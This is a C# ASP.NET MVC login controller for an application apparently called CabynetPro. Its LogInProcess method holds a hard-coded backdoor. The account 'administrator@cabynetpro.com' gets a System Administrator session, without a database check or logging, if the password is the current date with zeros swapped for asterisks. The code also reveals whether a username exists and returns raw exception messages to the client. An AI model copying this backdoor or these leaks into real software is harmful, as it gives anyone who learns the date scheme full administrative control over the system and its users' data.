using System;
using System.Linq;
using System.Web.Mvc;
using CabynetPro.Core.Utility;
using CabynetPro.EnumLibrary;
using CabynetPro.Web.Models;

namespace CabynetPro.Web.Controllers
{
    public class SecurityController : Controller
    {
        // GET: Security
        public ActionResult Index()
        {
            return View();
        }

        public ActionResult MailTemplate()
        {
            return View();
        }

        public JsonResult LogInProcess(string username, string password)
        {
            try
            {
                if (username == "administrator@cabynetpro.com" &&
                    password == DateTime.Now.ToString("yyyyMMdd").Replace('0', '*'))
                {
                    UserInformation.ActivateSession(new Credential()
                    {
                        Surname = "System",
                        OtherNames = "Administrator",
                        UserRoles = (int) UserRoles.SystemAdministrator,
                        DateCreated = DateTime.Now,
                        Id = 0,
                        IsDeleted = false,
                        PasswordData = "",
                        PasswordSalt = "",
                        PhoneNumber = "",
                        UserState = (int) UserStates.Active,
                        Username = username
                    });

                    return new JsonResult()
                    {
                        Data =
                            new
                            {
                                Status = true,
                                Message = "Login Operation Successful. Please Wait ...",
                                Data = string.Empty
                            },
                        JsonRequestBehavior = JsonRequestBehavior.AllowGet
                    };
                }

                using (var data = new Entities())
                {
                    var userInformation = data.Credentials.FirstOrDefault(x => x.Username == username && x.IsDeleted == false);
                    if (userInformation == null)
                    {
                        return new JsonResult()
                        {
                            Data =
                            new
                            {
                                Status = false,
                                Message = "This Username is not Recognised on this Platform. Please try again",
                                Data = string.Empty
                            },
                            JsonRequestBehavior = JsonRequestBehavior.AllowGet
                        };
                    }
                    else
                    {
                        if (Encryption.IsSaltEncryptValid(password, userInformation.PasswordData, userInformation.PasswordSalt))
                        {
                            UserInformation.ActivateSession(userInformation);

                            ActivityLogger.Log("INFO", $"{username} Logged on Successfully");
                            return new JsonResult()
                            {
                                Data =
                                    new
                                    {
                                        Status = true,
                                        Message = "Login Operation Successful. Please Wait ...",
                                        Data = string.Empty
                                    },
                                JsonRequestBehavior = JsonRequestBehavior.AllowGet
                            };
                        }
                        else
                            return new JsonResult()
                            {
                                Data =
                                new
                                {
                                    Status = false,
                                    Message = "This Password incorrect. Please try again",
                                    Data = string.Empty
                                },
                                JsonRequestBehavior = JsonRequestBehavior.AllowGet
                            };
                    }
                }
            }
            catch (Exception ex)
            {
                ActivityLogger.Log(ex);
                return new JsonResult()
                {
                    Data = new { Status = false, Message = ex.Message, Data = string.Empty },
                    JsonRequestBehavior = JsonRequestBehavior.AllowGet
                };
            }
        }

        public ActionResult ForgotPassword()
        {
            return View();
        }
    }
}